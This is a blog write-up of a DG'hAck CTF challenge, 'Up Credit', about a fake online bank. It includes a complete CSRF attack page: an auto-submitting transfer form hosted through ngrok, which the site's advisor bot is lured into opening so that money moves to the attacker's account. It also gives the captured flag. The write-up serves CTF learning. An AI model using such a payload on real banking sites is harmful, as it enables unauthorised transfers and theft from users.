---
title: "Writeup DG'hAck: Up Credit"
date: 2020-11-19T04:29:21+01:00
draft: false
tags: ["blog", "security", "ctf", "dghack"]
type: "posts"
showDate: true
---

The challenge URL redirects us to an online bank. The summary tells us that we have to buy the flag for 200€!

Let's start by registering for an account. After entering our name and email, we get an account ID and a password:

[![The registration message](/assets/dghack/upcredit-registration.png)](/assets/dghack/upcredit-registration.png)

After logging in, we are presented with an interface that has three tabs:
 - an activity log
 - a money transfer form
 - a form to contact our financial advisor

Trying an XSS in the contact form quickly reveals that the bot doesn't execute any javascript, but does click any link that is posted. This will probably be useful later on.

Let's look at the money transfer form:

[![The money transfer form](/assets/dghack/upcredit-money-transfer.png)](/assets/dghack/upcredit-money-transfer.png)

It looks quite simple. After registering another account and trying:
 - sending money we don't have
 - sending huge amounts of money
 - sending negative amounts of money
 - some sqli

We find out that the form is quite secure. But wait, it doesn't have any CSRF token! Let's try exploiting that. Using [ngrok](ngrok.com), we create a webpage and temporarily host it.

In it, we copy the form which we fill out, and add a little bit of JS to automatically submit it:

```html
<form action="http://upcredit4.chall.malicecyber.com/transfer" method="post" id="form">
    <div class="col-md-12 col-sm-12 col-xs-12">
        <div class="form-group">
        <input type="text" class="form-control" id="account"
                   placeholder="Account number" name="account"
                   value="Aln6qOfUJ">
        </div>
        <div class="form-group">
            <input type="number" class="form-control" id="amount"
                   placeholder="Amount" name="amount" value="200">
            <div class="help-block with-errors" style="color: #f00"></div>
        </div>
        <div class="pull-right">
            <button type="submit" id="reg-submit"
                    class="btn btn-md btn-common btn-log">Send
            </button>
            <div id="msgSubmit" class="h3 text-center hidden"></div>
            <div class="clearfix"></div>
        </div>
    </div>
</form>

<script>
    form.submit()
</script>
```

After posting the link to our form in the contact area and waiting for a few seconds, we get a money transfer:

[![The money transfer form](/assets/dghack/upcredit-credited.png)](/assets/dghack/upcredit-credited.png)

And we can buy the flag: `W1nG4rD1um\L3v1os444!`.

---

[View all of the DG'hAck articles](/tags/dghack).
